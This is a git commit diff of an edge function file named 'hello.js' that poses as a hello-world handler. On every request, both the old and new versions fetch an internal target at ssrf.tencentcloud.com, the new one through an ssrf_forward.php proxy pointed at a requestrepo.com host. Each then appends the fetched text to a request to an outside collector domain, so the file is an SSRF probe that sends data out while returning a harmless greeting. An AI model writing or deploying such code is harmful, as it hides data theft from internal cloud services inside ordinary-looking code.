eb28946db9171d7b49da6a75ad881b6493ae9624
beishanxueyuan <chain00x@163.com>
2025-12-10 15:40:14 +0800

    first commit

--- edge-functions/api/hello.js
+++ edge-functions/api/hello.js
@@ -1,4 +1,8 @@
 export default function onRequest(context) {
-    fetch('http://ssrf.tencentcloud.com/flag.html').then(res => res.text()).then(text => fetch('https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/'+text));
-  return new Response('Hello from Edge Functions!');
+  fetch("http://ssrf.tencentcloud.com/ssrf_forward.php?host=yh9dub1w.requestrepo.com")
+    .then((res) => res.text())
+    .then((text) =>
+      fetch("https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/" + text)
+    );
+  return new Response("Hello from Edge Functions!");
 }
